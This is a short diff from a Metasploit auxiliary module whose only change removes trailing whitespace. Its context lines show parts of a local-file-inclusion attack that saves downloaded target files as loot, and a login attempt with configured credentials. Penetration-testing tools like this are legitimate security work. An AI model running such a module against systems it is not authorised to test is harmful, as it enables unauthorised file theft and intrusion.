@@ -76,7 +76,7 @@ class Metasploit3 < Msf::Auxiliary
 				:category => "web",
 				:method   => "GET"
 			})
-				
+
 			loot = store_loot("lfi.data","text/plain",rhost, res.body,file)
 			vprint_good("#{rhost}:#{rport} - File #{file} downloaded to: #{loot}")
 		elsif res and res.code
@@ -89,7 +89,7 @@ class Metasploit3 < Msf::Auxiliary
 		pass = datastore['PASSWORD']
 
 		vprint_status("#{rhost}:#{rport} - Trying to login with #{user} / #{pass}")
-		
+
 		#test login
 		begin
 			res = send_request_cgi({
